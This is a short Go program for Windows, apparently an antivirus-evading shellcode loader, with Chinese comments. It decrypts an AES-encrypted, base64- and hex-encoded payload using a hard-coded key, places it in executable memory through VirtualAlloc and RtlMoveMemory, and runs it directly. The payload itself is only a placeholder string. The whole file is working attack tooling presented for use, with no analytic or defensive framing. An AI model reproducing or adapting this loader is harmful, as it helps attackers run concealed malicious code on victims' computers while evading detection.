package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	code, _ := hex.DecodeString(string(sDec))
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	syscall.Syscall(addr, 0, 0, 0, 0)

}

//去掉字符（末尾）
func UnPaddingText1(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}

//---------------DES解密--------------------

func DecrptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(nil)
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	blockMode.CryptBlocks(src, src)
	src = UnPaddingText1(src)
	return src
}

func main() {
	str := "AES-payload"
	key := []byte("LeslieCheungKwok")
	base_byte, _ := base64.StdEncoding.DecodeString(str)
	//co, _ := string(DecrptogAES(base_byte, key))
	//fmt.Println(string(co))
	build(string(DecrptogAES(base_byte, key)))
}
